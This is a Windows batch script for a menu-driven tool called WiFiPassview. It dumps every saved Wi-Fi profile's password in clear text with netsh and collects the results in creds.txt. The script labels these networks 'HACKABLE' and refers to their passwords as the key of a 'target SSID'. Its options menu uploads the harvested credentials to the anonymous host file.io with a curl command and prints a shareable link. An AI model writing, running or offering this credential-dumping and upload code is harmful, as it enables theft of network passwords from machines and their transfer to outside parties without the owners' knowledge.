set divider======================================
set tempdivider=================================================

rem =============================
rem Main Menu
rem =============================
:mainMenu
del null
cls
title %appname% %appvers% - %appstat% [Main Menu]
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo # %desc%
echo # %divider%
echo #
echo # Automated (Default) ....... [1]
echo # Manual .................... [2]
echo # Donate .................... [3]
echo # Credits ................... [4]
echo # Options ................... [5]
echo # Exit ...................... [6]
echo #
set /p "mainMenu=# $WiFiPassview> " || set mainMenu=1
if %mainMenu%==1 goto autoMode
if %mainMenu%==2 goto manualMode
if %mainMenu%==3 goto donate
if %mainMenu%==4 goto credits
if %mainMenu%==5 goto options
if %mainMenu%==6 goto exitProgram
goto fail4
pause>null

rem =============================
rem Automated Mode
rem =============================
:autoMode
cls
title %appname% %appvers% - %appstat% [Automated Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo #
echo # Automated mode will extract all the available SSID in this machine.
echo # Press any key to continue... (except power button lol)
pause>null
cls
title %appname% %appvers% - %appstat% [Automated Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Checking for wireless interface...
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]"
if %errorlevel%==1 goto fail3
cls
title %appname% %appvers% - %appstat% [Automated Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Checking for wireless interface...
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]" > temp.txt
echo # Available SSID in this Machine
type temp.txt
echo # %divider%
echo # Creating helper file...
echo @echo off >> helper.bat
echo setlocal enabledelayedexpansion >> helper.bat
echo for /f "tokens=5*" %%%%i in (temp.txt) do ( set val=%%%%i %%%%j >> helper.bat
echo if "!val:~-1!" == " " set val=!val:~0,-1! >> helper.bat
echo echo !val! ^>^> final.txt) >> helper.bat
echo for /f "tokens=*" %%%%i in (final.txt) do @echo SSID: %%%%i ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& netsh wlan show profiles name=%%%%i key=clear ^| findstr /N /R /C:"[ ]:[ ]" ^| findstr 33 ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt ^& echo # Key content is the password of your target SSID. ^>^> creds.txt ^& echo # %tempdivider% ^>^> creds.txt >> helper.bat
echo del /q temp.txt final.txt >> helper.bat
echo exit >> helper.bat
echo # Done...
echo # Extracting passwords and saving it...
ping localhost -n 3 >NUL
start helper.bat
echo # Done...
echo # Deleting temporary files...
ping localhost -n 3 >NUL
del /q helper.bat
echo # Done...
del null
ping localhost -n 2 >NUL
cls
title %appname% %appvers% - %appstat% [Automated Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo #
echo # WiFi credentials has been saved to "creds.txt", Press any key to continue... (except power button lol)
pause>null
goto mainMenu

rem =============================
rem Manual Mode
rem =============================
:manualMode
cls
title %appname% %appvers% - %appstat% [Manual Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Ready to scan available wifi profiles in this machine?
echo #
echo # Yes, continue ............. [1]
echo # Back to Main Menu ..........[2]
echo # 
set /p "confirmScan=# $WiFiPassview> " || set confirmScan=2
if %confirmScan%==1 goto manualConfirm
if %confirmScan%==2 goto mainMenu
goto fail4
pause>null

rem =============================
rem Manual Mode: Confirm Scan
rem =============================
:manualConfirm
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]"
if %errorlevel%==1 goto fail3
goto mainualContinue

rem =============================
rem Manual Mode: Continue
rem =============================
:mainualContinue
cls
title %appname% %appvers% - %appstat% [Manual Mode]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # THE FOLLOWING WIFI PROFILES BELOW ARE HACKABLE
echo # %divider%
netsh wlan show profiles
echo # %divider%
echo # Please enter the SSID of target WiFi
echo # (e.g. WIFI-NAME or if contains spaces do "WIFI NAME")
echo # Type "cancel" or hit enter to go back (default)
echo #
set /p "ssidname=# $WiFiPassview> " || set ssidname=cancel
if %ssidname%==cancel goto mainMenu
cls
netsh wlan show profiles name=%ssidname%
if %errorlevel%==1 goto fail1
cls
color %infouicolor%
echo # %tempdivider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %tempdivider%
echo # SSID: %ssidname%
echo # %tempdivider%
netsh wlan show profiles name=%ssidname% key=clear | findstr /N /R /C:"[ ]:[ ]" | findstr 33 > temp.txt
type temp.txt
echo # %tempdivider%
echo # Key content is the password of your target SSID.
echo # %tempdivider%
echo # 
echo # Save to creds.txt .................................. [1]
echo # Ignore and back to Main Menu (default) ............. [2]
echo #
echo # Note: If you hit enter or enter an invalid value the extracted password will not be saved.
echo #
set /p "manualMode=# $WiFiPassview> " || set manualMode=2
if %manualMode%==1 goto manualSave
if %manualMode%==2 goto manualDel
goto fail4
pause>null

rem =============================
rem Manual: Save
rem =============================
:manualSave
del null
cls
title %appname% %appvers% - %appstat%
echo # SSID: %ssidname% >> creds.txt
echo # %tempdivider% >> creds.txt
netsh wlan show profiles name=%ssidname% key=clear | findstr /N /R /C:"[ ]:[ ]" | findstr 33 >> creds.txt
echo # %tempdivider% >> creds.txt
echo # Key content is the password of your target SSID. >> creds.txt
echo # %tempdivider% >> creds.txt
del temp.txt null
cls
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo # %desc%
echo # %divider%
echo #
echo # WiFi credentials has been saved to "creds.txt", Press any key to open it in the file explorer...
pause>null
del null
start explorer %cd%
goto mainMenu

rem =============================
rem Manual: Delete
rem =============================
:manualDel
del null
cls
title %appname% %appvers% - %appstat%
del temp.txt null
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo # %desc%
echo # %divider%
echo #
echo # Extracted password has been deleted! Press any key to continue... (except power button lol)
pause>null
del null
goto mainMenu

rem =============================
rem Donate
rem =============================
:donate
del null
cls
title %appname% %appvers% - %appstat% [Donate]
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo # Donate and Support
echo # %divider%
echo #
echo # Do you like this tool? 
echo # Please consider to buy me a coffee or
echo # just donate to keep this project alive.
echo #
echo # Buy Me A Coffee ....... [1]
echo # PayPal ................ [2]
echo # Back to Main Menu ..... [3]
echo #
set /p "donate=# $WiFiPassview> " || set donate=3
if %donate%==1 goto buymeacoffee
if %donate%==2 goto paypal
if %donate%==3 goto mainMenu
goto fail4
pause>null

rem =============================
rem Donate: BMC
rem =============================
:buymeacoffee
start https://buymeacoff.ee/warengonzaga
goto donate

rem =============================
rem Donate: PayPal
rem =============================
:paypal
start https://paypal.me/warengonzagaofficial
goto donate

rem =============================
rem Credits
rem =============================
:credits
del null
cls
title %appname% %appvers% - %appstat% [Credits]
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo #
echo # This project is originally developed by Waren Gonzaga
echo # Version name Bella is a real name from Bella of Elris
echo # Elris is a popular KPOP Girl Group... (my bias lol)
echo # 
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto mainMenu

rem =============================
rem Options
rem =============================
:options
del null
cls
title %appname% %appvers% - %appstat% [Options]
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo #
echo # Delete "creds.txt" ......................... [1]
echo # Locate "creds.txt" ......................... [2]
echo # Open "creds.txt" in Notepad ................ [3]
echo # Upload "creds.txt" to Anonymous Cloud ...... [4]
echo # Generate WLAN Report ....................... [5]
echo # Premium Version ............................ [6]
echo # Elris? Here I Am ........................... [7]
echo # Back to Main Menu .......................... [8]
echo #
set /p "options= # $WiFiPassview> " || set options=5
if %options%==1 goto deleteCreds
if %options%==2 goto locateCreds
if %options%==3 goto notepadCreds
if %options%==4 goto uploadCreds
if %options%==5 goto wlanreport
if %options%==6 goto premium 
if %options%==7 goto elris
if %options%==8 goto mainMenu
goto fail4
pause>null

rem =============================
rem Options: Delete Creds
rem =============================
:deleteCreds
del null
type creds.txt
if %errorlevel%==1 goto fail2
cls
title %appname% %appvers% - %appstat%
del /q creds.txt
cls
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo # %desc%
echo # %divider%
echo #
echo # The "creds.txt" has been deleted! Press any key to continue... (except power button lol)
pause>null
goto options

rem =============================
rem Options: Locate Creds
rem =============================
:locateCreds
del null
cls
type creds.txt
if %errorlevel%==1 goto fail2
start explorer %cd%
goto options

rem =============================
rem Options: Open Creds in Notepad
rem =============================
:notepadCreds
del null
cls
type creds.txt
if %errorlevel%==1 goto fail2
start notepad creds.txt
goto options

rem =============================
rem Options: Upload Creds to Anonymous Cloud
rem =============================
:uploadCreds
del null
type creds.txt
if %errorlevel%==1 goto fail2
cls
title %appname% %appvers% - %appstat% [Upload Collected Creds]
color %infouicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # [Upload Creds to Anonymous Cloud]
echo #
echo # This feature will upload "creds.txt" to Anonymous Cloud powered by file.io
echo # Your anonymous upload will be available for 14 days only.
echo # 
echo # Continue Upload ....... [1]
echo # Back to Options ....... [2]
echo #
set /p "uploadCreds= # $WiFiPassview> " || set uploadCreds=2
if %uploadCreds%==1 goto continueUpload
if %uploadCreds%==2 goto options
goto fail5
pause>null

rem =============================
rem Upload Creds to Anonymous Cloud: Continue Upload
rem =============================
:continueUpload
del null
type creds.txt
if %errorlevel%==1 goto fail2
cls
title %appname% %appvers% - %appstat% [Uploading Creds to Cloud]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Uploading...
curl -F "file=@creds.txt" https://file.io > logs.txt
cls
title %appname% %appvers% - %appstat% [Uploading Creds to Cloud]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Uploaded!
echo # Generating link...
set /p url=<logs.txt
del logs.txt
echo # Got it!
echo # Here's your shortlink...
echo # %divider%
echo #
echo # Key: %url:~23,8% [Remember]
echo # Link: %url:~41,24%
echo #
echo # %divider%
echo #
echo # Open it to browser?
echo # Yes ....... [1]
echo # No ........ [2]
echo #
set /p "browseCreds= # $WiFiPassview> " || set browseCreds=2
if %browseCreds%==1 goto browsedCreds
if %browseCreds%==2 goto options
pause>null

rem =============================
rem Upload Creds to Anonymous Cloud: Browse Creds
rem =============================
:browsedCreds
start %url:~41,24%
goto options

rem =============================
rem Options: Generate WLAN Report
rem =============================
:wlanreport
del null
cls
title %appname% %appvers% - %appstat% [Generate WLAN Report]
color %infouicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # [Generate WLAN Report]
echo #
echo # This feature will execute a command to generate WLAN Report for this machine.
echo #
echo # Note: This feature requires an administrative permissions to proceed.
echo # Close this program and run it as administrator to be able to work!
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto wlanreportAdmin

rem =============================
rem Generate WLAN Report: Check Admin
rem =============================
:wlanreportAdmin
del null
cls
@echo off
title %appname% %appvers% - %appstat% [Generate WLAN Report]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Administrative permissions required. Detecting permissions...
ping localhost -n 2 >NUL
net session >nul 2>&1
if %errorLevel% == 0 (
echo # Administrator privileges found!
echo # Starting WLAN Reporting...
ping localhost -n 2 >NUL
goto wlanreportCreate
) else (
cls
color %erruicolor%
title %appname% %appvers% - %appstat% [Generate WLAN Report]
color %erruicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # ERROR ERROR ERROR [FAIL]
echo #
echo # WLAN reporting will not work!
echo # Close this program and run it as administrator and try again.
echo # %divider%
echo #
echo # Press any key to continue...
pause>null
goto options
)

rem =============================
rem Generate WLAN Report: Create
rem =============================
:wlanreportCreate
del null
cls
title %appname% %appvers% - %appstat% [Generate WLAN Report]
color %uicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
netsh wlan show wlanreport
echo # %divider%
echo #
echo # Press any key to continue...
pause>null
start C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html
goto options

rem =============================
rem Options: Premium
rem =============================
:premium
start https://bmc.xyz/l/wifipassview
goto options

rem =============================
rem Options: Elris
rem =============================
:elris
rem stan elris hahaha
start https://www.youtube.com/watch?v=tpLro7n3PWo
goto options

rem =============================
rem Manual: Fail Message (SSID)
rem =============================
:fail1
del null
cls
title %appname% %appvers% - %appstat% [Error]
color %erruicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # ERROR ERROR ERROR (FAIL)
echo # The WiFi profile name or the SSID doesn't exist!!!
echo # Make sure you enter the correct and exact one!
echo # Please try again or contact the developer for support...
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto mainMenu

rem =============================
rem Options: Fail Message (creds.txt)
rem =============================
:fail2
del null
cls
title %appname% %appvers% - %appstat% [Error]
color %erruicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # ERROR ERROR ERROR (FAIL)
echo # The file "creds.txt" does not exist!
echo # Run automated mode or manual mode first and save extracted passwords in "creds.txt" file.
echo # Please try again or contact the developer for support...
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto options

rem =============================
rem Manual: Fail Message (Wireless Interface)
rem =============================
:fail3
del null
cls
title %appname% %appvers% - %appstat% [Error]
color %erruicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # ERROR ERROR ERROR (FAIL)
echo # No Wireless Interface Detected!!!
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto mainMenu

rem =============================
rem Program Error
rem =============================
:fail4
del null
cls
title %appname% %appvers% - %appstat% [Error]
color %erruicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Invalid option! Please try again...
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto mainMenu

rem =============================
rem Program Error
rem =============================
:fail5
del null
cls
title %appname% %appvers% - %appstat% [Error]
color %erruicolor%
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
echo # Invalid option! Please try again...
echo # %divider%
echo #
echo # Press any key to continue... (except power button lol)
pause>null
goto options

rem =============================
rem Exit Option Function
rem =============================
:exitProgram
del null
exit
